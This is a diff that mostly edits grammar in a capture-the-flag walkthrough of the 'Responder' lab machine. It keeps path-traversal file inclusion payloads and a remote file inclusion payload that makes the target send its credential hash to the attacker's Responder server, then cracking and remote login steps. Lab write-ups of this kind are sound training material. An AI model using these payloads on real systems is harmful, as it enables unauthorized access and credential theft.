@@ -1,17 +1,3 @@
----
-layout:
-  title:
-    visible: true
-  description:
-    visible: false
-  tableOfContents:
-    visible: true
-  outline:
-    visible: true
-  pagination:
-    visible: true
----
-
 # Responder (Tier 1)
 
 ## <mark style="color:blue;">Description</mark>
@@ -50,7 +36,7 @@ layout:
 <figure><img src="../../.gitbook/assets/image (139) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about the HTTP protocol you can go [here](../../networks/protocols/http.md)
+To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
 {% endhint %}
 
 ***
@@ -63,7 +49,7 @@ To learn more about the HTTP protocol you can go [here](../../networks/protocols
 
 ***
 
-* The reason why the page didn't show me content was that it wasn't on my list of known hosts. To fix this I added it by modifying the _/etc/hosts_ file, relating the IP to the _unika.htb_ domain. After that, I hit the site again, and it worked properly
+* The reason why the page didn't show me content was that it wasn't on my list of known hosts. To fix this, I added it by modifying the _/etc/hosts_ file, relating the IP to the _unika.htb_ domain. After that, I hit the site again, and it worked properly
 
 {% code lineNumbers="true" %}
 ```bash
@@ -77,7 +63,7 @@ sudo nano /etc/hosts
 
 ***
 
-* Once there, I found a dashboard page for a business with some buttons which didn't work. Exploring the page I didn't find anything relevant so I used the [_Wappalyzer_](../../web-exploitation/tools-and-utilities.md#wappalyzer) extension to get some extra information about the technologies of the site
+* Once there, I found a dashboard page for a business with some buttons that didn't work. Exploring the page, I didn't find anything relevant, so I used the [_Wappalyzer_](../../web-exploitation/tools-and-utilities.md#wappalyzer) extension to get some extra information about the technologies of the site
 
 <figure><img src="../../.gitbook/assets/image (146) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -91,7 +77,7 @@ sudo nano /etc/hosts
 
 ***
 
-* Navigating to the top right corner I found a slider to select the language of the page which caught my attention. When I selected a different language from _english_, the language of the whole page changed and the URL showed a query reflecting this action
+* Navigating to the top right corner, I found a slider to select the language of the page, which caught my attention. When I selected a different language from _english_, the language of the whole page changed, and the URL showed a query reflecting this action
 
 <figure><img src="../../.gitbook/assets/image (144) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -109,7 +95,7 @@ sudo nano /etc/hosts
 
 ***
 
-* To test if this query could be vulnerable to a Local File Inclusion attack, I tried listing the contents of the _/etc/hosts_ file by changing the value of the _page_ parameter. After some tries, I found a successful payload and displayed the content of the asked file
+* To test if this query could be vulnerable to a Local File Inclusion attack, I tried listing the contents of the _/etc/hosts_ file by changing the value of the _page_ parameter. After some tries, I found a successful payload and displayed the content of the requested file
 
 {% code title="Payload" lineNumbers="true" %}
 ```url
@@ -120,7 +106,7 @@ page=../../../../../../../../windows/system32/drivers/etc/hosts
 <figure><img src="../../.gitbook/assets/image (151) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about Local File Inclusion exploitation you can go [here](../../web-exploitation/broken-access-control/local-file-inclusion.md)
+To learn more about Local File Inclusion and its exploitation, you can go [here](../../web-exploitation/broken-access-control/local-file-inclusion.md)
 {% endhint %}
 
 ***
@@ -176,12 +162,12 @@ sudo nano /usr/share/responder/Responder.conf
 <figure><img src="../../.gitbook/assets/image (162) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-We can check the interface using the`ifconfig` command. Normally the _tun0_ interface is the one related to the connection with a VPN
+We can check the interface using the`ifconfig` command. Normally, the _tun0_ interface is the one related to the connection with a VPN
 {% endhint %}
 
 ***
 
-* Then I went to the vulnerable endpoint again to modify the URL and tried to do in this case a Remote File Inclusion to my machine, to connect to the _Responder_ server I had deployed. With this action, the page displayed an error but when checking the terminal, _Responder_ had caught the credentials of the target
+* Then I went to the vulnerable endpoint again to modify the URL and tried to do a Remote File Inclusion to my machine, to connect to the _Responder_ server I had deployed. With this action, the page displayed an error, but when checking the terminal, _Responder_ had caught the credentials of the target
 
 {% code title="Payload" overflow="wrap" lineNumbers="true" %}
 ```url
@@ -194,12 +180,12 @@ page=//10.10.14.195/somefile
 <figure><img src="../../.gitbook/assets/image (164) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about Remote File Inclusion exploitation you can go [here](../../web-exploitation/broken-access-control/remote-file-inclusion.md)
+To learn more about Remote File Inclusion and its exploitation, you can go [here](../../web-exploitation/broken-access-control/remote-file-inclusion.md)
 {% endhint %}
 
 ***
 
-* I caught the communication from the _Administrator_ user and the corresponding hash, so I saved it in a text file. I could try to break the hash using the [_John The Ripper_](../../cryptography/tools-and-utilities.md#john-the-ripper) tool and the well-known _rouckyou.txt_ dictionary. After running it, I observed the cracking process was successful, obtaining the password _badminton_ for the user _Administrator_
+* I caught the communication from the _Administrator_ user and the corresponding hash, so I saved it in a text file. I could try to break the hash using the [_John the Ripper_](../../cryptography/tools-and-utilities.md#john-the-ripper) tool and the well-known _rockyou.txt_ dictionary. After running it, I observed the cracking process was successful, obtaining the password _badminton_ for the user _Administrator_
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -227,7 +213,7 @@ john -w=/usr/share/wordlists/rockyou.txt hash.txt
 
 ***
 
-* Having these credentials, I could try to connect to the system directly. For this purpose, I used the _evil-winrm_ tool to try to get a shell and it worked successfully
+* Having these credentials, I could try to connect to the system directly. For this purpose, I used the _evil-winrm_ tool to try to get a shell, and it worked successfully
 
 <figure><img src="../../.gitbook/assets/image (167) (1).png" alt=""><figcaption></figcaption></figure>
 
